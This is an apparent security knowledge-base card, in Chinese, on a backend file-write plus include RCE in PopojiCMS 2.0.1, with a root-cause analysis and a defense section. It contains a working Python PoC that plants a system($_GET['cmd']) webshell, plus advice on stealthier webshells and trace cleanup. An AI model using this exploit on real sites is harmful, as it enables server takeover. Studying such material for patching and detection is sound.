---
id: web-php-rce-popojicms-metasocial-txt-include
title: PopojiCMS 2.0.1 后台 Meta Social 设置无过滤写入 meta_social.txt，主题 index.php include 固定文件导致 RCE
type: scenario
domain: web
path: web/php/rce
technique: popojicms-metasocial-txt-write-include-rce
aliases:
- PopojiCMS RCE
- PopojiCMS 2.0.1 远程命令执行
- meta_social.txt
- metasocial 设置写入
- 主题 index.php include
- 后台写文件 getshell
tags:
- php
- cms
- rce
- arbitrary-file-write
- file-inclusion
- backend
- webshell
- popojicms
cve: []
severity: high
confidence: high
affected_versions: popojicms 2.0.1
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V351
  verified_at: '2026-11-09T00:59:43+08:00'
  notes: 已对照原文与图01-09核对：admin_setting.php metasocial() 在 auth 后对 POST 参数 meta_content 仅 stripslashes 即 fopen/fwrite 到 ../po-content/component/setting/meta_social.txt（图02 调试器显示 filename 为该路径）、主题 chingsy/index.php 第25行 include_once DIR_CON 下 meta_social.txt（图05）、后台注入与 ?cmd=whoami 执行（图06/07）、v3.0.0 删除功能（图09）均与原文一致。已修正正文写路径笔误；affected_versions 按原文「影响版本：popojicms 2.0.1」设为 popojicms 2.0.1。与 SeaCMS/CmsEasy/ZzzCMS 等后台写文件卡为同类不同组件，kb dedup 判 new；PoC 未执行。
---

## 一句话结论

PopojiCMS 2.0.1 后台的 Meta Social 设置把 `meta_content` 原样 `fwrite` 到 `po-content/component/setting/meta_social.txt`（无扩展名/内容过滤），而前台主题 `po-content/themes/chingsy/index.php` 又用 `include_once` 无条件包含这个固定路径的 txt 文件；攻击者（或拿到后台口令者）在设置里写入 PHP 代码后，访问站点根目录即触发代码执行，`?cmd=whoami` 返回命令输出。

## 原理

- **写入点**：`po-content/component/setting/admin_setting.php` 的 `metasocial()` 先做后台权限校验（`$this->auth($_SESSION['leveluser'],'setting','update')`），随后把 `stripslashes($_POST['meta_content'])` 直接写入 `"../".DIR_CON."/component/setting/meta_social.txt"`（实际落点为 `po-admin/po-content/component/setting/meta_social.txt`），使用 `fopen(...,'w')` + `fwrite`，没有对内容、扩展名或可执行字符做任何过滤。
- **包含点**：前台主题 `po-content/themes/chingsy/index.php` 第 25 行附近有 `<?php include_once DIR_CON.'/component/setting/meta_social.txt'; ?>`，用于输出社交 Meta 信息；主题被站点根 `index.php` 通过模板引擎加载，因此每次访问首页都会包含该文件。
- **为什么 .txt 也能执行**：PHP 的 `include`/`include_once` 按文件内容解析 PHP 标签，与扩展名无关；文件里只要出现 `<?php ... ?>`，包含时就会被当作 PHP 执行。写入点与包含点都不校验内容，形成完整的“任意内容写入 → 固定文件包含”链。
- **权限模型**：链的前半段在后台，需要管理员会话（弱口令、默认口令、凭据泄露、CSRF 等都可获得）；一旦进入后台，该功能把“设置项”变成“任意 PHP 文件写入”，进而把后台权限提升为 Web 进程代码执行。
- **版本边界**：原文对比 v3.0.0，发现修复方式是直接删除 Meta Social 功能点，而不是对写入/包含做过滤；2.0.1 受影响。

## 触发条件

- 目标运行 PopojiCMS 2.0.1（或同样保留 Meta Social 设置与主题 include 的版本）。
- 攻击者拥有后台管理员账号（或能通过弱口令/凭据泄露/CSRF 取得会话）。
- `po-content/component/setting/` 目录对 Web 进程可写，且 `meta_social.txt` 可被覆盖。
- 当前使用的主题在 `index.php` 中包含 `meta_social.txt`（默认主题 chingsy 满足）。
- 站点允许访问首页并执行 PHP（正常 PHP 运行环境）。

## 利用步骤

1. 使用管理员账号登录：`POST /po-admin/route.php?mod=login&act=proclogin`，提交 `username`、`password`，带 `Referer: /po-admin/index.php`，保持会话 Cookie。
2. 进入后台「设置 → Konfig / Meta Sosial」，向 `POST /po-admin/route.php?mod=setting&act=metasocial` 提交 `meta_content`，内容为包含 `<?php system($_GET['cmd']); ?>` 的 HTML 表单。
3. 服务端 `metasocial()` 将内容写入 `po-content/component/setting/meta_social.txt`，可访问该文件或后台编辑器确认写入。
4. 访问站点根：`GET /?cmd=whoami`；主题 `index.php` 包含 `meta_social.txt` 时执行 `system('whoami')`，返回命令输出。
5. 用同一入口执行任意命令/写入更隐蔽的 WebShell；必要时清理设置内容或删除文件以清痕。

## PoC

```python
import requests

url = "http://target/popojicms"
s = requests.Session()

# 1) 登录后台
s.post(f"{url}/po-admin/route.php?mod=login&act=proclogin",
       data={"username": "admin", "password": "***"},
       headers={"Referer": f"{url}/po-admin/index.php"})

# 2) 把 PHP 代码写入 meta_social.txt
php = """<html><body>
<form method="GET"><input type="TEXT" name="cmd"><input type="SUBMIT" value="Execute"></form>
<pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?></pre>
</body></html>"""
s.post(f"{url}/po-admin/route.php?mod=setting&act=metasocial",
       data={"meta_content": php},
       headers={"Referer": f"{url}/po-admin/index.php"})

# 3) 触发包含执行
r = s.get(f"{url}/?cmd=whoami")
print(r.text)
```

## 变体与关联

- **同类“配置写入→固定包含”CMS**：PbootCMS 后台站点信息写入 PHP + 静态页模板；SeaCMS 后台 admin_ping.php 参数拼接写入 `data/admin/ping.php`；DedeCMS 计划任务写 homepageset；CmsEasy 模板保存路径穿越写 WebShell；WordPress 后台主题编辑器直接写 PHP（见关联卡）。
- **无固定 include 时**：可把写入的 txt/html 与 LFI 组合，或写入 `.user.ini`/`.htaccess` 改变解析规则；若写入路径可控，还可路径穿越到可执行目录。
- **.txt 被包含的通用性**：任何 `include`/`require` 固定路径的场景都等价于“该路径可写即可执行”，扩展名与 MIME 不影响 PHP 解析。
- **关联卡片**：[[web-php-rce-pbootcms-backend-siteinfo-copy-webshell]]、[[web-php-rce-seacms-admin-ping-post-write-php-code]]、[[web-php-rce-dedecms-homepageset-task-do-stored-file-write]]、[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]、[[web-php-file-inclusion-session-poisoning-sess-file]]（写入与会话文件包含的同类思路）。

## 检测与防御

- **代码修复**：对 `meta_content` 做 HTML 转义/白名单过滤，禁止 `<?php`、`<script>` 等标签，并在写入前校验内容类型；更彻底的做法是把社交 Meta 配置存数据库而非可被 include 的文件。
- **消除 include sink**：不要把用户/后台可写目录纳入 `include` 路径；主题改为从数据库读取并转义输出；开启 `open_basedir`，限制 include 只能落在模板目录。
- **权限与账号**：后台强口令、限制后台访问来源、管理员操作二次认证；避免默认口令与凭据复用。
- **检测**：监控对 `po-content/component/setting/*.txt` 的写入、后续对站点根带 `cmd=`/`exec=` 等参数的请求；文件完整性监控发现 `meta_social.txt` 内容变化；WAF 拦截 `<?php`、`system(` 等明显标签。
- **应急**：检查 `meta_social.txt` 与其他 setting 文件是否含 PHP 代码，恢复原始内容、轮换后台口令并排查同目录其他被写入文件。
